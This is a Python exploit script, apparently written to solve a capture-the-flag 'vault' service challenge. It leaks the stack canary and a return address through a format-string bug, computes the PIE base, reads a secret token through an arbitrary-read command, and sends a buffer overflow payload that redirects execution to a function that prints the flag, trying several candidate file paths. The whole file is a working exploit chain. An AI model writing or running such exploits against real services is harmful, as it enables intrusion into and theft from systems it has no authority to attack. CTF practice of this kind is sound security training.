"""Try several candidate record paths, one fresh connection/leak per guess."""
import socket
import sys

RET_INTO_MAIN_OFFSET = 0x1E64
G_TOKEN_OFFSET = 0x5040
EMIT_RECORD_OFFSET = 0x14FA
CANARY_POS = 13
RETADDR_POS = 15


class Conn:
    def __init__(self, sock):
        self.s = sock
        self.buf = b""

    def _fill(self, n=4096):
        chunk = self.s.recv(n)
        if not chunk:
            raise EOFError("connection closed")
        self.buf += chunk

    def recv_until(self, marker, maxlen=65536):
        while marker not in self.buf and len(self.buf) < maxlen:
            self._fill()
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def sendall(self, data):
        self.s.sendall(data)

    def drain(self, timeout=3):
        self.s.settimeout(timeout)
        out = self.buf
        self.buf = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        return out


def leak_value(s, pos):
    s.sendall(f"INSPECT %{pos}$p\n".encode())
    line = s.recv_until(b"\n")
    text = line.decode(errors="replace").strip()
    return int(text.rsplit(" ", 1)[-1], 16)


def readat(s, addr):
    s.sendall(f"READAT {addr:x}\n".encode())
    line = s.recv_until(b"\n")
    text = line.decode(errors="replace").strip()
    hexpart = text.split("bytes: ", 1)[-1]
    return bytes.fromhex(hexpart.strip())


def attempt(host, port, path_fmt):
    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(10)
    s = Conn(sock)
    s.recv_until(b"vault> ")
    canary = leak_value(s, CANARY_POS)
    s.recv_until(b"vault> ")
    retaddr = leak_value(s, RETADDR_POS)
    s.recv_until(b"vault> ")
    pie_base = retaddr - RET_INTO_MAIN_OFFSET
    g_token_addr = pie_base + G_TOKEN_OFFSET
    emit_record = pie_base + EMIT_RECORD_OFFSET
    raw = readat(s, g_token_addr)
    seal = raw.split(b"\x00", 1)[0].decode(errors="replace")
    s.recv_until(b"vault> ")

    path = path_fmt.format(seal=seal)

    s.sendall(b"STASH\n")
    s.recv_until(b"stage the record path: ")
    s.sendall(path.encode() + b"\n")
    s.recv_until(b"vault> ")

    payload = b"A" * 72 + canary.to_bytes(8, "little") + b"C" * 8 + emit_record.to_bytes(8, "little")
    s.sendall(b"ARCHIVE\n")
    s.recv_until(b"frame: ")
    s.sendall(payload)
    sock.shutdown(socket.SHUT_WR)
    out = s.drain(4)
    sock.close()
    return seal, path, out


def main():
    host = sys.argv[1]
    port = int(sys.argv[2])
    candidates = [
        "/var/vault/{seal}/record",
        "/var/vault/{seal}/flag",
        "/var/vault/{seal}/record.dat",
        "/var/vault/{seal}.flag",
        "/var/vault/{seal}.dat",
        "/var/vault/{seal}/seal",
        "/var/vault/{seal}/pwnable",
        "/var/vault/record-{seal}",
        "/var/vault/{seal}/vault.flag",
        "/var/vault/{seal}/flag.txt",
    ]
    for fmt in candidates:
        try:
            seal, path, out = attempt(host, port, fmt)
        except Exception as e:
            print(f"{fmt!r:45} -> ERROR {e}")
            continue
        text = out.decode(errors="replace")
        flag_found = "pwnable{" in text
        print(f"{path!r:45} -> {text!r}" + ("  <<<< FLAG" if flag_found else ""))
        if flag_found:
            break


if __name__ == "__main__":
    main()
